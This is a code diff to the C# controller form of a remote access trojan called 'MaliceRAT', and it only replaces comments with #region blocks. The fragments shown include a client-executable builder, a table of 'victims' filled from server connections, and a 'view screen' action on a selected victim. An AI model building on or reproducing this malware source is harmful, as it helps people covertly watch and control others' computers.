@@ -29,7 +29,7 @@ namespace MaliceRAT
             server.InfoReceived += Server_InfoReceived;
             server.ClientDisconnected += Server_ClientDisconnected;
         }
-        // Config
+        #region Config
         private void setConfigKey(string key, string value)
         {
             string configPath = Path.Combine(Application.StartupPath, "config.json");
@@ -55,7 +55,9 @@ namespace MaliceRAT
                 setConfigKey("server_port", gunaHostPort.Text);
             };
         }
+        #endregion
 
+        #region Build
         private async Task<string> CompileClientExeAsync()
         {
             string projectPath = gunaProjPath.Text;
@@ -221,8 +223,9 @@ namespace MaliceRAT
                 }
             }
         }
+        #endregion
         
-        // Victims table
+        #region Victims table
         private async Task AddVictimToGrid(Victim victim) 
         {
             if (InvokeRequired) 
@@ -272,7 +275,9 @@ namespace MaliceRAT
                 }
             }
         }
-        // Server events
+        #endregion
+
+        #region Server events
         private async void Server_InfoReceived(Victim client) 
         {
             await AddVictimToGrid(client);
@@ -281,7 +286,9 @@ namespace MaliceRAT
         {
             RemoveVictimFromGrid(client);
         }
-        // Context Menu
+        #endregion
+
+        #region Context Menu
         private int? GetSelectedId()
         {
             if (gunaVictimsTable.SelectedRows.Count > 0)
@@ -313,7 +320,6 @@ namespace MaliceRAT
             gunaVictimsTable.MouseDown += (sender, e) => ContextMenuUtilities.GunaVictimsTable_MouseDown(sender, e, gunaVictimsTable);
         }
 
-        #region Victim context menu
         private void ViewScreen_Click(object sender, EventArgs e)
         {
             var id = GetSelectedId();
